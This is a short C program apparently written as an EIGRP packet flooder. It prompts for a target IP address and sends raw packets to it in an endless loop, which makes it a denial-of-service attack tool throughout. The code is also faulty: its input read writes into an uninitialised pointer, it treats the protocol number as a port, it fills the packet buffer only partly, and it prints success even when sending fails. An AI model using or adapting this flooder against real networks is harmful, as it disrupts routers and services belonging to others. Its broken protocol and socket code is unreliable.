#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <stdint.h>

// Define EIGRP header and constants here
#define EIGRP_PORT 88
#define EIGRP_HEADER_LEN 20

// EIGRP header (simplified)
struct EIGRPHeader {
    uint8_t opcode;
    uint8_t reserved;
    uint16_t checksum;
    uint16_t flags;
    uint16_t length;
} __attribute__((packed));

// Function to calculate checksum
uint16_t checksum(const uint8_t *data, size_t length) {
    uint32_t sum = 0;
    while (length > 1) {
        sum += *(const uint16_t *)data;
        data += 2;
        length -= 2;
    }
    if (length > 0) {
        sum += *(const uint8_t *)data;
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    return ~sum;
}

void send_eigrp_packet(const char *ipdest) {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("socket");
        // return 1;
    }

    // Construct EIGRP packet (simplified)
    struct EIGRPHeader eigrp_header;
    eigrp_header.opcode = 1; // Example opcode
    eigrp_header.reserved = 0;
    eigrp_header.flags = 0;
    eigrp_header.length = htons(EIGRP_HEADER_LEN);
    eigrp_header.checksum = 0;

    uint8_t packet[EIGRP_HEADER_LEN];
    memcpy(packet, &eigrp_header, sizeof(eigrp_header));

    // Calculate checksum
    eigrp_header.checksum = checksum(packet, sizeof(eigrp_header));
    memcpy(packet, &eigrp_header, sizeof(eigrp_header));

    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(EIGRP_PORT);
    dest_addr.sin_addr.s_addr = inet_addr(ipdest); // EIGRP multicast address

    if (sendto(sockfd, packet, EIGRP_HEADER_LEN, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
        perror("sendto");
        close(sockfd);
        // return 1;
    }

    printf("EIGRP packet sent successfully.\n");

    close(sockfd);
}

void flood(const char *ipdest) {
    while (1)
    {
        send_eigrp_packet(ipdest);
    }
    
}

int main() {
    char *ipdest;
    printf("Enter IP Address Target >> "); scanf("%c", ipdest);
    flood(ipdest);
    
    return 0;
}